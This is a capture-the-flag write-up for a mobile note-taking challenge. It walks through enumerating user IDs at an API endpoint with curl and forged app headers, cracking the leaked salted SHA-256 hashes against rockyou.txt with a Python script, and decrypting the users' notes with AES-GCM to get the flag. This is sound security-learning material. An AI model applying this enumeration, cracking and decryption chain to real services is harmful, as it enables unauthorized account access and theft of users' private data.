# mobisec \[280 Points] (44 Solves)
```
Secure note-taking app.

You are given a wordlist. Furthermore rockyou.txt may be of use.

Note that the initial data on the server was stored differently, and decryption should take in consideration: nonce, tag, ciphertext = encrypted_data[:16], encrypted_data[16:32], encrypted_data[32:]. Use pycryptodome and default key derivation hashing algorithm.
```
We are given a [wordlist](./attachment/wordlist.txt) and an [apk](./attachment/mobisec.apk)

---

## Writeup

First, let's take a look at the wordlist
```
fecd8168-6fd5-4349-89d5-aafcba664e55
9975f865-e2c9-4c48-a419-0abd2138092e
0eb67839-7994-4434-898b-a4faa585ed59
d317c651-3433-4e3b-9a8b-2e57432119f1
f224cd61-8b4f-4157-934d-6b5f64958976
...
```
It contains 100 UIDs, which will probably come in handy later.

Starting the APK, we enter the remote IP and port and are prompted for a password.
If we run mitmproxy/httptoolkit we will see that submitting the password sends a request
to the endpoint `/api/v1/acc/pass/8b6f880a-7d5f-4853-acc9-096cbe612ae1`.
And the response is
```json
{"secret":{"hash":""}}
```

Alright, what if we substitute the UID in the endpoint to the ones in the given wordlist?
We could do this with a python script, but GNU parallel is much more ergonomic
```bash
parallel 'curl -X GET "http://34.89.178.225:30286/api/v1/acc/pass/{}" \\
  -H "Accept: application/json" \\
  -H "Accept-Encoding: gzip" \\
  -H "Connection: Keep-Alive" \\
  -H "Host: 34.89.178.225:30286" \\
  -H "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Phone Build/TQ2B.230505.005.A1)" \\
  -H "X-MOBISEC: ef75826d9de13292593aa57f82a7763d" > {}'
```
(All of the headers exact replica of the ones the app used)

Eventually we get 3 uuids for which the server returns a hash.
```
==> 4d1713c1-ef9e-46b1-9fee-9ac57d4180b8 <==
{"secret":{"hash":"e045171f3d3d93ee538b4673f7b5184bfd7d9eaa200f29f81ae1b7123a32ebca"}}

==> c8d8a726-a7c2-4b13-98a4-15f9c3831ef4 <==
{"secret":{"hash":"77518b39e620ac271bfc58639796160cb3984af0a3e5f4367230ad768855e8e7"}}

==> f79dd76f-2ce4-420f-bf46-f0ba82af04fb <==
{"secret":{"hash":"87bcb0554d72bd277ae6c2795b8e09e03c56ed4314352449c3d371b70cdc1ea8"}}
```

We can now extract all the hashes
```bash
$ cat * | jq .secret.hash | tr -d '"'
e045171f3d3d93ee538b4673f7b5184bfd7d9eaa200f29f81ae1b7123a32ebca
77518b39e620ac271bfc58639796160cb3984af0a3e5f4367230ad768855e8e7
87bcb0554d72bd277ae6c2795b8e09e03c56ed4314352449c3d371b70cdc1ea8
```

The description hints us to use rockyou.txt, so that's what we will do. But first,
how were these hashes generated?

Opening the apk in `jadx` we can see that when we enter a password, a salt is
prepended to it and the whole thing is sha256 hashed. \
The salt is
```
LbhXabjVaCenpgvprFnygfNerHavdhrylTrarengrqSbeRirelCnffOhgVzGbbYnmlGbPbqrGung:)
```

The fact that it is **so** long prevents us form really using johntheripper, as
it, for some reason, has a forced salt length limit.

*When in doubt, use python.*

And yes, python is the **worst** with loops, and yet, it didn't take that long.
```py
import hashlib
from multiprocessing import Pool, cpu_count

salt = "LbhXabjVaCenpgvprFnygfNerHavdhrylTrarengrqSbeRirelCnffOhgVzGbbYnmlGbPbqrGung:)"

target_hashes = {
    "e045171f3d3d93ee538b4673f7b5184bfd7d9eaa200f29f81ae1b7123a32ebca",
    "77518b39e620ac271bfc58639796160cb3984af0a3e5f4367230ad768855e8e7",
    "87bcb0554d72bd277ae6c2795b8e09e03c56ed4314352449c3d371b70cdc1ea8"
}

def process_passwords(password):
    password = password.strip()
    combined = salt + password
    sha256_hash = hashlib.sha256(combined.encode('utf-8')).hexdigest()

    if sha256_hash in target_hashes:
        return (sha256_hash, password)
    return None

def main():
    wordlist_path = "/rockyou.txt"
    with open(wordlist_path, "r", encoding="latin-1") as f:
        passwords = f.readlines()

    with Pool(processes=cpu_count()) as pool:
        results = pool.map(process_passwords, passwords)

    for result in filter(None, results):
        print(f"{result[0]} {result[1]}")

if __name__ == "__main__":
    main()
```

And after aprox 8 seconds we get
```
e045171f3d3d93ee538b4673f7b5184bfd7d9eaa200f29f81ae1b7123a32ebca killerpink007
87bcb0554d72bd277ae6c2795b8e09e03c56ed4314352449c3d371b70cdc1ea8 SHALLOWgrounds13
77518b39e620ac271bfc58639796160cb3984af0a3e5f4367230ad768855e8e7 86390627
```

Attempting to use one of the passwords (and replacing in the proxy the default UID
to the UID corresponding to the password) we see that the app makes another
request to `/api/v1/sec/f79dd76f-2ce4-420f-bf46-f0ba82af04fb` which again returns
to us some json with base64 encoded, encrypted data.

Looking more at the decompiled apk, we notice the function
```java
public static byte[] J(String str, byte[] bArr) {
    byte[] bytes = "0123456789abcdef".getBytes();
    byte[] copyOfRange = Arrays.copyOfRange(bArr, 0, 12);
    byte[] copyOfRange2 = Arrays.copyOfRange(bArr, 12, bArr.length);
    SecretKeySpec secretKeySpec = new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(new PBEKeySpec(str.toCharArray(), bytes, 100000, 256)).getEncoded(), "AES");
    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    cipher.init(2, secretKeySpec, new GCMParameterSpec(128, copyOfRange));
    return cipher.doFinal(copyOfRange2);
}
```

which decrypts the encrypted data with `str` - which is the password of that user - and a salt, using AES GCM.
Let's write the decryption in python.

First we will request the encrypted data from the server, and then we will decrypt.
```py
import requests
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Cipher import AES
import base64


IP = "34.107.71.117"
PORT = "31761"


def decrypt_aes_gcm(password, b64_encrypted_data):
    encrypted_data = base64.b64decode(b64_encrypted_data)

    nonce = encrypted_data[:16]
    tag = encrypted_data[16:32]
    ciphertext = encrypted_data[32:]

    salt = b"0123456789abcdef"
    key = PBKDF2(password, salt, dkLen=32, count=100000)

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)

    decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)

    return decrypted_data


def retrieve_encrypted_data(uid):
    url = f"http://{IP}:{PORT}/api/v1/sec/{uid}"
    headers = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Host": f"{IP}:{PORT}",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Phone Build/TQ2B.230505.005.A1)",
        "X-MOBISEC": "ef75826d9de13292593aa57f82a7763d",
    }

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        json_response = response.json()
        return json_response["secret"]["text"]
    raise Exception(
        f"Failed to retrieve data for UID {uid}. Status Code: {response.status_code}"
    )


users = [
    "4d1713c1-ef9e-46b1-9fee-9ac57d4180b8 e045171f3d3d93ee538b4673f7b5184bfd7d9eaa200f29f81ae1b7123a32ebca killerpink007".split(),
    "f79dd76f-2ce4-420f-bf46-f0ba82af04fb 87bcb0554d72bd277ae6c2795b8e09e03c56ed4314352449c3d371b70cdc1ea8 SHALLOWgrounds13".split(),
    "c8d8a726-a7c2-4b13-98a4-15f9c3831ef4 77518b39e620ac271bfc58639796160cb3984af0a3e5f4367230ad768855e8e7 86390627".split(),
]

for uid, _, password in users:
    try:
        b64_encrypted_data = retrieve_encrypted_data(uid)
        decrypted_data = decrypt_aes_gcm(password, b64_encrypted_data)
        print(f"Decrypted data for UID {uid}:", decrypted_data.decode("utf-8"))
    except Exception as e:
        print(f"Error processing UID {uid}: {e}")

```

Success!

**Flag:** `CTF{77cd55d22ef0d516a45ed0e238fbc5dbc4c93b0824047ea3e0a0509a5a9735ac}`
